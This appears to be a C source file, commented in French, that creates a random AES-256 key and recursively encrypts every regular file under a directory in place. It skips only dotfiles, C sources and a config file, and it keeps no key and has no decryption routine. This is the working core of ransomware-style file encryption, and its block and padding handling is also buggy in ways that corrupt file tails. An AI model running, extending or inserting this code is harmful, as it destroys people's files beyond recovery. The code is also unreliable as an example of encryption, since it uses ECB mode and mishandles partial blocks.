#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/rand.h>
#include <openssl/aes.h>

#define FICHIER_DE_CONF "config.ini"
#define KEY_SIZE 32   // Taille de la clé AES en octets (256 bits)
#define BLOCK_SIZE 16 // Taille du bloc AES en octets

// Génère une clé aléatoire
void genererCleAleatoire(unsigned char *cle, size_t taille)
{
    if (RAND_bytes(cle, taille) != 1)
    {
        perror("Erreur lors de la génération de la clé aléatoire");
        exit(EXIT_FAILURE);
    }
}

// Chiffre un bloc de données avec AES en mode ECB
void chiffrerBlocAES(unsigned char *data, const unsigned char *aes_key)
{
    AES_KEY key;
    if (AES_set_encrypt_key(aes_key, KEY_SIZE * 8, &key) != 0)
    {
        perror("Erreur lors de l'initialisation de la clé AES");
        exit(EXIT_FAILURE);
    }

    AES_encrypt(data, data, &key);
}

// Chiffre un fichier avec AES


void chiffrerFichierAES(const char *nomFichier, const unsigned char *aes_key)
{
    // Ouvrir le fichier en mode lecture/écriture binaire
    FILE *file = fopen(nomFichier, "rb+");
    if (!file)
    {
        perror("Erreur lors de l'ouverture du fichier");
        return;
    }

    // Obtenir la taille du fichier
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Taille du bloc pour le chiffrement AES
    size_t block_size = BLOCK_SIZE;

    // Allouer de la mémoire pour stocker un bloc de données
    unsigned char *data = malloc(block_size);
    if (!data)
    {
        perror("Erreur lors de l'allocation de mémoire");
        fclose(file);
        exit(EXIT_FAILURE);
    }

    // Lire et chiffrer chaque bloc de données dans le fichier
    while (1)
    {
        
        size_t bytes_read = fread(data, 1, block_size, file);
        if (!bytes_read)
            break;

        // Chiffrer le bloc de données
        chiffrerBlocAES(data, aes_key);

        // Retourner au début du bloc et écrire les données chiffrées
        fseek(file, -((long)bytes_read), SEEK_CUR);
        fwrite(data, 1, bytes_read, file);

        // Se déplacer vers le prochain bloc
        fseek(file, bytes_read, SEEK_CUR);
    }

    // Gérer le rembourrage pour le dernier bloc si nécessaire
    size_t padding_size = block_size - (file_size % block_size);
    if (padding_size > 0 && padding_size < block_size)
    {
        // Remplir le tampon avec des zéros
        memset(data, 0, block_size);

        // Revenir à la position correcte pour le rembourrage
        fseek(file, -((long)padding_size), SEEK_END);

        // Écrire le rembourrage
        fwrite(data, 1, padding_size, file);

        // Revenir à la position correcte pour le rembourrage
        fseek(file, -((long)padding_size), SEEK_END);

        // Chiffrer le bloc de rembourrage
        chiffrerBlocAES(data, aes_key);

        // Écrire les données chiffrées
        fwrite(data, 1, block_size, file);
        
    }

    // Fermer le fichier et libérer la mémoire
    fclose(file);
    free(data);
}


// Traite tous les fichiers du répertoire et chiffre les fichiers réguliers avec AES
void chiffrerRepertoire(const char *directoryName, const unsigned char *aes_key)
{
    struct dirent *dir;
    DIR *d = opendir(directoryName);

    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            if (dir->d_name[0] != '.' && (dir->d_name[1] != '\0' || dir->d_name[1] != '.') &&
                dir->d_name[strlen(dir->d_name) - 1] != 'h' && dir->d_name[strlen(dir->d_name) - 1] != 'c' &&
                strcmp(dir->d_name, FICHIER_DE_CONF) != 0)
            {
                char path[4096] = "";
                strcat(path, directoryName);
                strcat(path, "/");
                strcat(path, dir->d_name);

                if (dir->d_type == DT_DIR)
                {
                    chiffrerRepertoire(path, aes_key);
                }
                else if (dir->d_type == DT_REG)
                {
                    chiffrerFichierAES(path, aes_key);
                }

            }
           
        }
        closedir(d);
    }
}
